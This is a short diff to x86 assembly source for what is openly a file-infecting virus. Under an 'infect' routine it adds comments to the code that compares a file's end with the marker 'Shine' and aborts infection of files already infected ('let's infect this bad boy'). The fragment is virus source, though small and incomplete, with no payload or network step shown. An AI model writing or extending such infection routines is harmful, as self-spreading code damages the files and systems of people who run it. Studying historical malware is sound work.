@@ -120,9 +120,9 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bp
      mov di, si+5
      mov cx, 5
-     rep cmpsb
-     je .abort_infection
-     push bx                      
+     rep cmpsb       ; Is EOF = 'Shine'?
+     je .abort_infection  ; Yes, abort infection
+     push bx         ; Nope, let's infect this bad boy             
      
 
 .abort_infection:
